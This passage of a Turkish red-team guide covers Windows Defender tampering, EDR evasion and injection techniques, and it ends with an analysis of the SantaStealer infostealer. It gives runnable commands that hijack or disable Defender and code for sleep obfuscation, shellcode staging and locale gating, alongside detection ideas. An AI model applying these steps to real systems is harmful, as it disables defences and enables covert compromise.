CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notlar ve kısıtlamalar
- ClipUp'ın yazdığı içeriği yerleştirme dışında kontrol edemezsiniz; primitive, hassas içerik enjeksiyonundan ziyade bozulma için uygundur.
- Bir service kurmak/başlatmak ve reboot penceresi için local admin/SYSTEM gerekir.
- Zamanlama kritiktir: hedef açık olmamalıdır; boot-time execution file lock'larını önler.

Tespitler
- Özellikle boot civarında, non-standard launcher'lar tarafından parent edilmiş olağandışı argümanlara sahip `ClipUp.exe` process creation olayları.
- Şüpheli binary'leri auto-start olarak yapılandıran ve Defender/AV'den önce tutarlı şekilde başlayan yeni service'ler. Defender startup failures öncesindeki service creation/modification işlemlerini araştırın.
- Defender binary'leri/Platform directory'leri üzerinde file integrity monitoring; protected-process flag'lerine sahip process'ler tarafından yapılan beklenmedik file creation/modification işlemleri.
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` ile oluşturulan process'leri ve AV olmayan binary'lerin anomalous PPL level kullanımını arayın.

Azaltımlar
- WDAC/Code Integrity: hangi signed binary'lerin PPL olarak ve hangi parent'lar altında çalışabileceğini kısıtlayın; meşru context'ler dışındaki ClipUp invocation işlemlerini engelleyin.
- Service hygiene: auto-start service'lerin creation/modification işlemlerini kısıtlayın ve start-order manipulation işlemlerini izleyin.
- Defender tamper protection ve early-launch protections özelliklerinin etkin olduğundan emin olun; binary corruption'a işaret eden startup error'larını araştırın.
- Ortamınızla uyumluysa security tooling barındıran volume'larda 8.3 short-name generation özelliğini devre dışı bırakmayı değerlendirin (kapsamlı şekilde test edin).

## Platform Version Folder Symlink Hijack ile Microsoft Defender Tampering

Windows Defender, çalışacağı platformu şu konumun altındaki subfolder'ları enumerate ederek seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

En yüksek lexicographic version string'e sahip subfolder'ı (ör. `4.18.25070.5-0`) seçer, ardından Defender service process'lerini buradan başlatır (service/registry path'lerini buna göre günceller). Bu seçim, directory reparse point'leri (symlink'ler) dahil olmak üzere directory entry'lerine güvenir. Bir administrator, Defender'ı attacker-writable bir path'e yönlendirmek ve DLL sideloading veya service disruption elde etmek için bundan yararlanabilir.<sup>[[21]](#references)[[22]](#references)</sup>

Ön koşullar
- Local Administrator (Platform folder altında directory/symlink oluşturmak için gereklidir)
- Reboot gerçekleştirme veya Defender platform re-selection tetikleme yeteneği (boot sırasında service restart)
- Yalnızca built-in tools gereklidir (mklink)

Çalışma nedeni
- Defender kendi folder'larına yapılan write işlemlerini engeller, ancak platform selection directory entry'lerine güvenir ve hedefin protected/trusted bir path'e çözümlendiğini doğrulamadan lexicographically en yüksek version'ı seçer.

Adım adım (örnek)
1) Mevcut platform folder'ın writable bir clone'unu hazırlayın; örneğin `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde klasörünüze işaret eden daha yüksek sürümlü bir dizin symlink'i oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Tetikleyici seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe'nin (WinDefend) yönlendirilmiş yoldan çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Yeni process path'ini `C:\TMP\AV\` altında ve service configuration/registry'nin bu konumu yansıttığını gözlemlemelisiniz.

Post-exploitation seçenekleri
- DLL sideloading/code execution: Defender'ın application directory içinden yüklediği DLL'leri, Defender'ın process'lerinde code execute etmek için bırakın/değiştirin. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink'i kaldırın; böylece bir sonraki start işleminde configured path çözümlenemez ve Defender start edilemez:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Bu tekniğin tek başına privilege escalation sağlamadığını; admin hakları gerektirdiğini unutmayın.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams, runtime evasion işlemlerini C2 implantından çıkarıp hedef modülün kendisine taşıyabilir; bunun için modülün Import Address Table (IAT) tablosuna hook ekleyerek seçili API'leri attacker-controlled, position-independent code (PIC) üzerinden yönlendirebilir. Bu yaklaşım, evasion işlemlerini birçok kitin sunduğu küçük API yüzeyinin (ör. CreateProcessA) ötesine taşır ve aynı korumaları BOF'lara ve post-exploitation DLL'lerine genişletir.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

High-level yaklaşım
- Reflective loader kullanarak hedef modülün yanında bir PIC blob stage edin (prepend edilmiş veya companion olarak). PIC self-contained ve position-independent olmalıdır.
- Host DLL yüklenirken IMAGE_IMPORT_DESCRIPTOR yapısını tarayın ve hedeflenen import'ların (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) IAT girişlerini thin PIC wrapper'larına işaret edecek şekilde patch'leyin.
- Her PIC wrapper, gerçek API adresine tail-call yapmadan önce evasion işlemlerini gerçekleştirir. Yaygın evasion işlemleri şunlardır:
- Call etrafında memory mask/unmask uygulama (ör. beacon bölgelerini encrypt etme, RWX→RX, page name/permission değerlerini değiştirme), ardından call sonrasında eski hâline getirme.
- Call-stack spoofing: benign bir stack oluşturun ve target API'ye geçiş yapın; böylece call-stack analizi beklenen frame'leri çözümler.<sup>[[9]](#references)</sup>
- Uyumluluk için bir interface export edin; böylece bir Aggressor script (veya eşdeğeri) Beacon, BOF'lar ve post-ex DLL'leri için hangi API'lerin hook edileceğini register edebilir.

Why IAT hooking burada
- Hook'lanmış import'u kullanan tüm code'lar için çalışır; tool code'unu değiştirmeyi veya belirli API'lerde proxy görevi görmesi için Beacon'a güvenmeyi gerektirmez.
- Post-ex DLL'lerini kapsar: LoadLibrary* hook'lanarak modül yüklemelerini (ör. System.Management.Automation.dll, clr.dll) intercept edebilir ve aynı masking/stack evasion işlemlerini bunların API call'larına uygulayabilirsiniz.
- CreateProcessA/W'i wrap ederek call-stack tabanlı detection'lara karşı process-spawning post-ex command'lerinin güvenilir biçimde kullanılmasını yeniden sağlar.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Patch'i relocations/ASLR sonrasında ve import'un ilk kullanımından önce uygulayın. TitanLdr/AceLdr gibi Reflective loader'lar, yüklenen modülün DllMain'i sırasında hooking yapıldığını gösterir.
- Wrapper'ları küçük ve PIC-safe tutun; gerçek API'yi patch uygulamadan önce yakaladığınız orijinal IAT değerinden veya LdrGetProcedureAddress üzerinden resolve edin.
- PIC için RW → RX geçişlerini kullanın ve writable+executable sayfalar bırakmaktan kaçının.

Call-stack spoofing stub
- Draugr-style PIC stub'lar sahte bir çağrı zinciri (benign modüller içindeki return address'ler) oluşturur ve ardından gerçek API'ye pivot eder.
- Bu, Beacon/BOF'lerden sensitive API'lere giden canonical stack'leri bekleyen detection'ları etkisiz hâle getirir.
- API prologue'undan önce beklenen frame'lerin içine yerleşmek için stack cutting/stack stitching teknikleriyle birlikte kullanın.

Operasyonel entegrasyon
- PIC ve hook'ların DLL yüklendiğinde otomatik olarak initialize olması için reflective loader'ı post-ex DLL'lerinin başına ekleyin.
- Beacon ve BOF'lerin kod değişikliği olmadan aynı evasion path'ten şeffaf biçimde yararlanması için bir Aggressor script kullanarak target API'leri register edin.

Detection/DFIR değerlendirmeleri
- IAT integrity: non-image (heap/anon) address'lere resolve olan entry'ler; import pointer'larının periyodik doğrulanması.
- Stack anomalies: loaded image'lara ait olmayan return address'ler; non-image PIC'e ani geçişler; tutarsız RtlUserThreadStart ancestry.
- Loader telemetry: IAT'e process içinden yapılan write işlemleri, import thunk'larını değiştiren erken DllMain activity'si, load sırasında oluşturulan beklenmedik RX region'lar.
- Image-load evasion: hooking LoadLibrary* kullanıyorsa, memory masking event'leriyle korelasyon gösteren şüpheli automation/clr assembly load'larını izleyin.

İlgili building block'ler ve örnekler
- Load sırasında IAT patching yapan reflective loader'lar (örn. TitanLdr, AceLdr)
- Memory masking hook'ları (örn. simplehook) ve stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub'ları (örn. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Resident PICO üzerinden import-time IAT hook'ları

Bir reflective loader'ı kontrol ediyorsanız, loader'ın `GetProcAddress` pointer'ını önce hook'ları kontrol eden custom resolver ile değiştirerek import'ları **`ProcessImports()` sırasında** hook'layabilirsiniz:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Transient loader PIC kendisini free ettikten sonra hayatta kalan bir **resident PICO** (persistent PIC object) oluşturun.
- Loader'ın import resolver'ını overwrite eden bir `setup_hooks()` function'ı export edin (örn. `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress` içinde ordinal import'larını atlayın ve `__resolve_hook(ror13hash(name))` gibi hash-based bir hook lookup kullanın. Bir hook varsa onu return edin; yoksa gerçek `GetProcAddress`'e delegate edin.
- Hook target'larını link time'da Crystal Palace `addhook "MODULE$Func" "hook"` entry'leriyle register edin. Hook, resident PICO içinde bulunduğu için geçerliliğini korur.

Bu yöntem, loaded DLL'nin code section'ını load sonrasında patch etmeden **import-time IAT redirection** sağlar.

### Target PEB-walking kullanırken hook'lanabilir import'ları zorlama

Import-time hook'lar yalnızca function gerçekten target'ın IAT'inde bulunuyorsa tetiklenir. Bir modül API'leri PEB-walk + hash ile resolve ediyorsa (import entry yoksa), loader'ın `ProcessImports()` path'inin bunu görmesi için gerçek bir import zorlayın:

- Hashed export resolution'ı (örn. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) `&WaitForSingleObject` gibi doğrudan bir referansla değiştirin.
- Compiler bir IAT entry üretir; reflective loader import'ları resolve ederken interception mümkün olur.

### `Sleep()` patch'lemeden Ekko-style sleep/idle obfuscation

`Sleep`'i patch etmek yerine implant'ın kullandığı **gerçek wait/IPC primitive'lerini** hook'layın (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Uzun wait'ler için çağrıyı, idle sırasında in-memory image'ı encrypt eden Ekko-style bir obfuscation chain içine wrap edin:<sup>[[31]](#references)[[27]](#references)</sup>

- `NtContinue`'u crafted `CONTEXT` frame'leriyle çağıran bir callback sequence schedule etmek için `CreateTimerQueueTimer` kullanın.
- Tipik chain (x64): image'ı `PAGE_READWRITE` yapın → full mapped image üzerinde `advapi32!SystemFunction032` ile RC4 encrypt yapın → blocking wait'i gerçekleştirin → RC4 decrypt yapın → PE section'ları walk ederek **section başına permissions'ları restore edin** → completion'ı signal edin.
- `RtlCaptureContext` bir template `CONTEXT` sağlar; bunu birden fazla frame'e clone edin ve her adımı çağırmak için register'ları (`Rip/Rcx/Rdx/R8/R9`) ayarlayın.

Operasyonel detay: image maskeliyken caller'ın devam etmesi için uzun wait'ler adına (örn. `WAIT_OBJECT_0`) “success” return edin. Bu pattern, idle window'ları sırasında modülü scanner'lardan gizler ve klasik “patched `Sleep()`” signature'ından kaçınır.

Detection fikirleri (telemetry-based)
- `NtContinue`'a işaret eden `CreateTimerQueueTimer` callback burst'leri.
- Büyük, contiguous ve image boyutundaki buffer'lar üzerinde kullanılan `advapi32!SystemFunction032`.
- Büyük aralıklı `VirtualProtect` çağrısının ardından custom per-section permission restoration.

### Sleep-obfuscation gadget'ları için runtime CFG registration

CFG-enabled target'larda `jmp [rbx]` veya `jmp rdi` gibi mid-function gadget'lara yapılan ilk indirect jump genellikle gadget modülün CFG metadata'sında bulunmadığı için process'i `STATUS_STACK_BUFFER_OVERRUN` ile crash ettirir. Ekko/Kraken-style chain'lerin hardened process'ler içinde çalışmaya devam etmesi için:<sup>[[30]](#references)</sup>

- Chain tarafından kullanılan her indirect destination'ı `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` ve `CFG_CALL_TARGET_VALID` entry'leriyle register edin.
- Loaded image'lar (`ntdll`, `kernel32`, `advapi32`) içindeki address'ler için `MEMORY_RANGE_ENTRY`, **image base**'te başlamalı ve **full image size**'ı kapsamalıdır.
- Manually mapped/PIC/stomped region'lar için bunun yerine **allocation base** ve allocation size kullanın.
- Yalnızca dispatch gadget'ını değil, indirect olarak ulaşılan export'ları da (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall'ları) ve indirect target hâline gelecek attacker-controlled executable section'ları da mark edin.

Bu, ROP/JOP-style sleep chain'lerini “yalnızca non-CFG process'lerde çalışır” durumundan `/guard:cf` ile compile edilmiş `explorer.exe`, browser'lar, `svchost.exe` ve diğer endpoint'ler için yeniden kullanılabilir bir primitive hâline getirir.

### Sleeping thread'ler için CET-safe stack spoofing

Full `CONTEXT` replacement noisy olabilir ve CET Shadow Stack system'lerinde bozulabilir; çünkü spoof edilmiş bir `Rip` yine de hardware shadow stack ile uyuşmalıdır. Daha güvenli bir sleep-masking pattern'i şöyledir:<sup>[[30]](#references)</sup>

- Aynı process içindeki başka bir thread'i seçin ve `NtQueryInformationThread` aracılığıyla onun `NT_TIB` / TEB stack bounds'unu (`StackBase`, `StackLimit`) okuyun.
- Mevcut thread'in gerçek TEB/TIB'sini backup edin.
- Gerçek sleeping context'i `GetThreadContext` ile capture edin.
- Spoof context'e yalnızca gerçek `Rip`'i copy edin; spoof edilmiş `Rsp`/stack state'i değiştirmeyin.
- Sleep window'ı sırasında spoof thread'inin `NT_TIB`'sini current TEB'e copy edin; böylece stack walker'lar legitimate bir stack range içinde unwind eder.
- Wait tamamlandıktan sonra original TIB ve thread context'i restore edin.

Bu yöntem CET-consistent bir instruction pointer'ı korurken, unwind'leri doğrulamak için TEB stack metadata'sına güvenen EDR stack walker'larını yanıltır.

### APC-based alternative: Kraken Mask

Timer-queue dispatch fazla signature'lıysa, aynı sleep-encrypt-spoof-restore sequence'i queued APC'ler kullanan suspended bir helper thread içinden çalıştırabilirsiniz:<sup>[[27]](#references)</sup>

- Entrypoint olarak `NtTestAlert` bulunan bir helper thread oluşturun.
- Hazırlanmış `CONTEXT` frame/APC'lerini `NtQueueApcThread` ile queue edin ve `NtAlertResumeThread` ile drain edin.
- Default 64 KB thread stack'ini tüketmemek için chain state'i helper stack yerine heap üzerinde saklayın.
- Start event'i atomik olarak signal etmek ve block olmak için `NtSignalAndWaitForSingleObject` kullanın.
- TIB/context'i restore etmeden önce main thread'i suspend edin (`NtSuspendThread` → restore → `NtResumeThread`); böylece bir scanner'ın half-restored stack'i yakalayabileceği race window'ını azaltın.

Bu yaklaşım, aynı RC4 masking ve stack-spoofing hedeflerini korurken `CreateTimerQueueTimer` + `NtContinue` signature'ını helper-thread/APC signature'ıyla değiştirir.

Ek detection fikirleri
- Sleep, wait veya APC dispatch'ten kısa süre önce `VmCfgCallTargetInformation` ile yapılan `NtSetInformationVirtualMemory` çağrıları.
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` veya `ConnectNamedPipe` etrafında wrap edilen `GetThreadContext`/`SetThreadContext`.
- `NtQueryInformationThread` sonrasında current thread'in TEB/TIB stack bounds'una doğrudan write yapılması.
- Dolaylı olarak `SystemFunction032`, `VirtualProtect` veya section-permission restoration helper'larına ulaşan `NtQueueApcThread`/`NtAlertResumeThread` chain'leri.
- Signed module'ler içinde dispatch pivot olarak `FF 23` (`jmp [rbx]`) veya `FF E7` (`jmp rdi`) gibi kısa gadget signature'larının tekrarlı kullanımı.


## Precision Module Stomping

Module stomping, obvious private executable memory allocate etmek veya yeni bir sacrificial DLL load etmek yerine payload'ları target process içinde zaten mapped olan bir DLL'nin **`.text` section'ından** çalıştırır. Overwrite target, process'in hâlâ ihtiyaç duyduğu code path'lerini bozmadan payload'ı barındırabilecek, **loaded ve disk-backed bir image** olmalıdır.<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

`uxtheme.dll` veya `comctl32.dll` gibi common module'lere karşı naive stomping kırılgandır: DLL remote process'te loaded olmayabilir ve code region çok küçükse process crash olur. Daha reliable bir workflow:

1. Target process module'lerini enumerate edin ve zaten loaded olan DLL'lerden oluşan **names-only include list** tutun.
2. Önce payload'ı build edin ve **exact byte size** değerini kaydedin.
3. Candidate DLL'leri disk üzerinde scan edin ve PE section **`.text` `Misc_VirtualSize`** değerini payload size ile karşılaştırın. Bu, file size'dan daha önemlidir; çünkü executable section'ın **memory'ye mapped edildiğindeki** boyutunu yansıtır.
4. **Export Address Table (EAT)**'i parse edin ve stomp start offset olarak exported bir function RVA seçin.
5. **Blast radius**'ı hesaplayın: payload seçilen function boundary'sini aşarsa, memory'de arkasından yerleştirilmiş adjacent export'ları overwrite eder.

Wild'da görülen tipik recon/selection helper'ları:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operasyonel notlar
- `LoadLibrary`/beklenmeyen image load telemetry'sinden kaçınmak için uzak process'te **zaten yüklenmiş** DLL'leri tercih edin.
- Hedef uygulama tarafından nadiren çalıştırılan export'ları tercih edin; aksi takdirde normal code path'leri thread oluşturulmadan önce veya sonra stomp edilmiş byte'lara ulaşabilir.
- Büyük implant'lar genellikle shellcode embedding işleminin string literal'dan **byte-array/braced initializer** biçimine değiştirilmesini gerektirir; böylece injector source içinde buffer'ın tamamı doğru şekilde temsil edilir.

Detection fikirleri
- Daha yaygın private RWX/RX allocation'ları yerine **image-backed executable page'lere** (`MEM_IMAGE`, `PAGE_EXECUTE*`) yapılan remote write işlemleri.
- Bellekteki byte'ları diskteki backing file ile artık eşleşmeyen export entry point'leri.
- Çalıştırmaya, ilk byte'ları kısa süre önce değiştirilmiş meşru bir DLL export'u içinde başlayan remote thread'ler veya context pivot'ları.
- DLL `.text` page'lerine yönelik, ardından thread creation gelen şüpheli `VirtualProtect(Ex)` / `WriteProcessMemory` dizileri.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3), klasik remote write path'inden (`VirtualAllocEx` + `WriteProcessMemory`) kaçınan bir **process-injection / EDR-evasion** tekniğidir. Byte'ları hâlihazırda çalışan bir target'a kopyalamak yerine, Windows'un **seçili `CreateProcessW` startup parameter'larını child process'e kopyalaması** ve bunları `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) içinde saklaması gerçeğinden yararlanır.<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` tarafından kopyalanan poison edilebilir taşıyıcılar

Kullanışlı taşıyıcılar şunlardır:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` ile) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Pratik taşıyıcı kısıtlamaları:

- `lpCommandLine`, `CreateProcessW` için writable memory'yi göstermelidir ve null terminator dâhil **32.767 Unicode karakter** ile sınırlıdır.
- `lpEnvironment`, art arda gelen `NAME=VALUE\0` string'lerinden oluşan ve fazladan bir `\0` ile sonlandırılan Unicode environment block olmalıdır.
- `lpReserved` resmi olarak reserved olduğundan `ShellInfo` mapping'i, kararlı ve belgelenmiş bir contract yerine implementation detail olarak değerlendirilmelidir.

Bu durum, normal process creation'ı **payload-transfer primitive** hâline getirir. Operator, child process'i attacker-controlled startup data ile oluşturur ve Windows'un cross-process copy işlemini gerçekleştirmesine izin verir.

### Remote write API'leri olmadan remote lookup flow

Child oluşturulduktan sonra, kopyalanan buffer'ı **read-only** primitive'lerle resolve edin:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` değerini alın
2. Remote `PEB`'i okuyun
3. `PEB.ProcessParameters`'ı takip edin
4. `RTL_USER_PROCESS_PARAMETERS`'ı okuyun
5. Seçilen pointer'ı kullanın:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimal flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Kopyalanan parametre buffer'ını çalıştırma

Kopyalanan parametre bölgesi genellikle `RW` durumundadır ve executable değildir. Yaygın bir P3 chain şöyledir:

1. Process'i normal şekilde oluşturun (suspended olmadan)
2. `NtProtectVirtualMemory` / `VirtualProtectEx` ile seçilen parametre page'ini executable hâle getirin
3. `PROCESS_INFORMATION` içinde zaten döndürülen main thread handle'ını yeniden kullanın
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP`'i overwrite ederek) execution'ı redirect edin

Classic thread hijacking workflow'larının aksine bu yöntem **`SuspendThread` / `ResumeThread` gerektirmez**; context, döndürülen main thread handle'ı üzerinden doğrudan değiştirilebilir.

Bu, injection için yaygın olarak monitor edilen çeşitli API'leri kullanmaktan kaçınır:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- çoğu zaman ayrıca `SuspendThread` / `ResumeThread`

### Null-byte limitation ve staged shellcode

Her üç carrier da **string veya string-like data** olduğundan, `0x00` içeren raw payload transfer sırasında truncate edilir. Uygulanabilir bir workaround, constant'ları runtime sırasında yeniden oluşturan ve ardından arbitrary bir second stage yükleyen **null-free first stage** kullanmaktır.

Basit bir pattern, XOR-based constant synthesis kullanmaktır:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Bu, ilk aşamanın taşınan parametreye null byte gömmeden stack string'leri, API argümanlarını, DLL path'lerini veya ikinci aşama shellcode loader'ını oluşturmasını sağlar.

### İlk aşamadan stack tabanlı API çağrıları

İlk aşamanın `LoadLibraryA` gibi API'leri çağırması gerektiğinde şunları yapabilir:

- string/buffer'ı hedef stack'e push etmek
- **32-byte x64 shadow space** ayırmak
- `RCX`, `RDX`, `R8`, `R9` register'larını sabitlere veya `RSP`-relative pointer'lara ayarlamak
- çağrıdan önce `RSP`'yi **16-byte aligned** tutmak

İkinci aşama daha sonra stack'ten bir `PAGE_READWRITE` allocation'ına kopyalanabilir, `VirtualProtect` ile `PAGE_EXECUTE_READ` durumuna geçirilebilir ve doğrudan RWX allocation'dan kaçınarak çalıştırılabilir.

### Detection fikirleri

Yazarların belirttiği iyi hunting fırsatları:

- **process-parameter pages** üzerinde `VirtualProtectEx` / `NtProtectVirtualMemory` ile executable protection ayarlanması
- bu protection değişikliğinin ardından `SetThreadContext` / `NtSetContextThread` kullanılması
- `PEB` ve ardından `RTL_USER_PROCESS_PARAMETERS` için remote read işlemleri
- process creation sırasında alışılmadık derecede uzun / yüksek entropy'li `lpCommandLine`, `lpEnvironment` veya `STARTUPINFO.lpReserved` değerleri

### Notlar

- P3, tek başına tam bir execution primitive değil, **cross-process transfer trick**'idir: kopyalanan parameter hâlâ execute-permission değişikliğine ve bir execution redirection method'una ihtiyaç duyar.
- `RtlCreateProcessReflection` / Dirty Vanity, `NtWriteVirtualMemory` ve `NtCreateThreadEx` gibi şüpheli primitive'lere dahili olarak ulaştığı için yazarlar tarafından değerlendirildi ancak reddedildi.

## Fileless Evasion ve Credential Theft için SantaStealer Tradecraft'ı

SantaStealer (diğer adıyla BluelineStealer), modern info-stealer'ların AV bypass, anti-analysis ve credential access tekniklerini tek bir workflow içinde nasıl birleştirdiğini gösterir.<sup>[[24]](#references)</sup>

### Keyboard layout gating ve sandbox delay

- Bir config flag'i (`anti_cis`), `GetKeyboardLayoutList` aracılığıyla kurulu keyboard layout'larını enumerate eder. Cyrillic bir layout bulunursa sample boş bir `CIS` marker'ı bırakır ve stealer'ları çalıştırmadan terminate olur; böylece hariç tutulan locale'lerde hiçbir zaman detonate olmazken hunting için bir artifact bırakır.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Katmanlı `check_antivm` mantığı

- Variant A, process listesini dolaşır, her adı özel bir rolling checksum ile hash'ler ve sonucu debugger/sandbox'lar için gömülü blocklist'lerle karşılaştırır; checksum işlemini computer name üzerinde tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
- Variant B, sistem özelliklerini (process-count floor, yakın zamanda gerçekleşen uptime) inceler, VirtualBox eklentilerini tespit etmek için `OpenServiceA("VBoxGuest")` çağrısı yapar ve single-stepping tespit etmek amacıyla sleep işlemlerinin çevresinde timing checks gerçekleştirir. Herhangi bir eşleşme, modüller başlatılmadan önce işlemi durdurur.

### Fileless helper + çift ChaCha20 reflective loading

- Ana DLL/EXE, diske bırakılan veya bellekte manuel olarak map edilen bir Chromium credential helper içerir; fileless mode, helper artifact'larının yazılmaması için import'ları ve relocation'ları kendisi çözer.
- Bu helper, ikinci aşama DLL'yi ChaCha20 ile iki kez şifrelenmiş olarak depolar (iki adet 32-byte key + 12-byte nonce). Her iki pass tamamlandıktan sonra blob'u reflectively load eder (`LoadLibrary` kullanılmaz) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) kaynaklı `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export'larını çağırır.<sup>[[25]](#references)</sup>
- ChromElevator rutinleri, canlı bir Chromium browser'a inject etmek için direct-syscall reflective process hollowing kullanır, AppBound Encryption key'lerini devralır ve ABE hardening'e rağmen password'ları/cookie'leri/credit card'ları doğrudan SQLite database'lerinden decrypt eder.


### Modüler in-memory collection & chunked HTTP exfil

- `create_memory_based_log`, global `memory_generators` function-pointer table'ını dolaşır ve etkin her modül için (Telegram, Discord, Steam, screenshots, documents, browser extensions vb.) bir thread başlatır. Her thread sonuçları paylaşılan buffer'lara yazar ve yaklaşık 45 saniyelik join window sonrasında file count bilgisini bildirir.
- Tamamlandıktan sonra her şey, statically linked `miniz` library kullanılarak `%TEMP%\\Log.zip` olarak zip'lenir. Ardından `ThreadPayload1` 15 saniye sleep eder ve archive'ı HTTP POST üzerinden, browser'ın `multipart/form-data` boundary'sini taklit ederek (`----WebKitFormBoundary***`), 10 MB'lık chunk'lar halinde `http://<C2>:6767/upload` adresine stream eder. Her chunk `User-Agent: upload`, `auth: <build_id>` ve isteğe bağlı `w: <campaign_tag>` header'larını ekler; son chunk ise C2'nin yeniden birleştirmenin tamamlandığını anlaması için `complete: true` ekler.

## References

- [1] [Advanced Evasion Tradecraft: Hassas Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack'ler, malware için artık bedava geçiş yok](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer için yeni infection chain ve ConfuserEx tabanlı obfuscation](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – zero trust'ınıza güvenmeli misiniz? Zscaler posture checks'in bypass edilmesi](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell'den önce: Storm-2603'ün önceki ransomware operasyonlarını incelemek](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Forwarded Export'ların kötüye kullanılması](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Docs – Known DLL'ler](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [16] [Microsoft – Protected Process'ler](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
